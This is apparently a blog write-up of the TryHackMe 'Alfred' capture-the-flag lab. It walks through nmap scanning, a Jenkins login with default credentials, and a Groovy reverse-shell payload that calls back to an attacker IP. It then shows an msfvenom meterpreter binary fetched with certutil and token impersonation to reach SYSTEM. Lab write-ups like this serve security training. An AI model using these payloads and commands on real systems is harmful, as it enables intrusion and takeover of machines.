---
layout: post
title: THM Alfred WriteUp
date: 2025-02-26
categories:
  - TryHackMe
  - TryHackMe-Windows
tags:
  - CTF
  - TryHackMe
  - Windows
  - Jenkins
  - Privilege-Escalation
  - Token-Impersonation
  - SeImpersonatePrivilege
  - Windows-System-Enumeration
media_subpath: /assets/img/Alfred
---
![Desktop View](Alfred.png){: w="400"  h="400" }



# Alfred Skills


>**Alfred** is an easy Windows machine where we will use the following skills:

- **Port Discovery**
- **Jenkins Enumeration**
- **Exploiting Jenkins Script Console**
- **Command Execution via Jenkins**
- **Windows Privilege Enumeration**
- **Exploiting SeImpersonatePrivilege**
- **Token Impersonation for Privilege Escalation**
- **Gaining SYSTEM Access on Windows**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **80, 3389** & port **8080**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.154.52 -oG allPorts
Nmap scan report for 10.10.154.52
Host is up, received user-set (0.13s latency).
Scanned at 2025-02-26 19:31:48 CET for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
8080/tcp open  http-proxy    syn-ack ttl 127
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -Pn -p80,3389,8080 10.10.154.52 -oN targeted
Nmap scan report for 10.10.154.52
Host is up (0.088s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2025-02-25T18:31:42
|_Not valid after:  2025-08-27T18:31:42
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we have to check the following ports & services:

- **Port 80 --> Microsoft IIS httpd 7.5**
- **Port 3389 --> Unknown (Likely RDP)**
- **Port 8080 --> Jetty 9.4.z-SNAPSHOT**

Let's start with the **HTTP (80)** service.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.154.52
http://10.10.154.52 [200 OK] Country[RESERVED][ZZ], Email[alfred@wayneenterprises.com], HTTPServer[Microsoft-IIS/7.5], IP[10.10.154.52], Microsoft-IIS[7.5]
```

Nothing useful found aside the email **alfred@wayneenterprises.com**, so let's take a look inside the website, once inside ***http://10.10.154.52***, seems like this page is not hosting any web application.

![Desktop View](AlfredMainPage.png) 

So, let's check the other HTTP service at **port 8080**.

---
## Port 8080 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.154.52:8080
http://10.10.154.52:8080 [403 Forbidden] Cookies[JSESSIONID.5292b917], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.5292b917], IP[10.10.154.52], Jenkins[2.190.1], Jetty[9.4.z-SNAPSHOT], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-you-are-authenticated-as,x-you-are-in-group-disabled,x-required-permission,x-permission-implied-by]

http://10.10.154.52:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.5292b917], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.5292b917], IP[10.10.154.52], Jenkins[2.190.1], Jetty[9.4.z-SNAPSHOT], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

This seems more like an exploitable website, we can see that we are facing a **Jenkins** app (**v2.190.1**).

Let's take a look inside the website, once inside ***http://10.10.154.52:8080***.

![View Desktop](AlfredWebLogin.png)

We are facing a login page, the first thing i always do at login forms, is try some default credentials manually, in this case the developer did not change the default credentials and we can login with `admin:admin`.

![View Desktop](AlfredWebDashboard.png)

Once in the dashboard, **Jenkins** allow authenticated users to run **Groovy scripts**, so we can try to engage a reverse shell, using a **Groovy** payload.

In order to access the field where we can execute **Groovy scripts** we can follow the next steps: **Manage Jenkins** -> **Scripts Console** and we should see a field asking us execute **Groovy scripts**.

![Desktop View](AlfredGroovyScript.png)

We can now set a listener and execute the next **Groovy payload** and we should get a reverse shell.

```bash
String host="10.11.116.52";int port=443;String cmd="cmd";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Set the listener at port **443**, copy the payload into the form and then execute it, we should get a reverse shell.

```bash
❯ rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [10.11.116.52] from (UNKNOWN) [10.10.154.52] 49230
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami
whoami
alfred\bruce
```

---
## Shell as Bruce

Once inside we can now read the `user.txt` flag located at `C:\Users\bruce\Desktop\user.txt`.

```bash
C:\Users\bruce\Desktop>type C:\Users\bruce\Desktop\user.txt
type C:\Users\bruce\Desktop\user.txt
7900******1963edf2e1******9ae2a0
```

Then the first thing i like to do is list the privileges that the current user own.

```bash
C:\Program Files (x86)\Jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

We own all the privileges that exist as user `bruce`, we could escalate privileges manually, using tools like `RogueWinRM.exe`,  `PrintSpoofer64.exe`, etc. But i find quite more practical the use of `metasploit`.

### Upgrading our Shell to Meterpreter

In order to get a meterpreter session from a normal shell, we have to create a meterpreter payload and upload it to the target machine.

```bash
❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.116.52 LPORT=4444 -f exe -o reverse-shell.exe
❯ python3 -m http.server 80
```

Then in the target machine, create a `Temp` folder and download the `reverse-shell.exe` file.

```bash
C:\>mkdir Temp
C:\>cd Temp
C:\Temp>certutil -urlcache -split -f http://10.11.116.52/reverse-shell.exe

```
 
Once with the `reverse-shell.exe` in the target machine, open a listener in `metasploit` and configure it.

```bash
❯ msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.11.116.52
msf6 exploit(multi/handler) > run
```

Then we can execute the `reverse-shell.exe` binary.

```bash
C:\Temp>reverse-shell.exe
```

We should receive a meterpreter session at the `metasploit` listener.

```bash
[*] Started reverse TCP handler on 10.11.116.52:4444 
[*] Sending stage (177734 bytes) to 10.10.154.52
[*] Meterpreter session 1 opened (10.11.116.52:4444 -> 10.10.154.52:49248) at 2025-02-26 20:08:38 +0100
```

### Gaining Access as NT AUTHORYTY\SYSTEM

Once inside we can easily load the `incognito` module in order to impersonate a user.

```bash
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
alfred\bruce
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
No tokens available
```

There we go, we can impersonate `NT AUTHORITY\SYSTEM` user.

```bash
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Then we can just migrate to a process owned by `SYSTEM` and we can now read the `root.txt` flag.

```bash
meterpreter > pgrep lsass.exe
676
meterpreter > migrate 676
[*] Migrating from 2612 to 676...
[*] Migration completed successfully.
meterpreter > cat /Windows/System32/config/root.txt
dff0******8f280250f25******46b4a
```

---
## Final Thoughts

The **Alfred** machine provides a well-structured learning experience, focusing on **Jenkins exploitation** and **Windows privilege escalation**. The initial access phase requires thorough **service enumeration**, leading to the discovery of an exposed Jenkins instance. Exploitation is straightforward, emphasizing the risks of **default credentials** and **misconfigured Jenkins permissions** to execute commands remotely. Privilege escalation introduces **token impersonation**, leveraging **SeImpersonatePrivilege** to escalate to **SYSTEM**. A solid machine that reinforces core skills in **Windows exploitation** and serves as an excellent exercise for real-world scenarios.

![Desktop View](AlfredPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

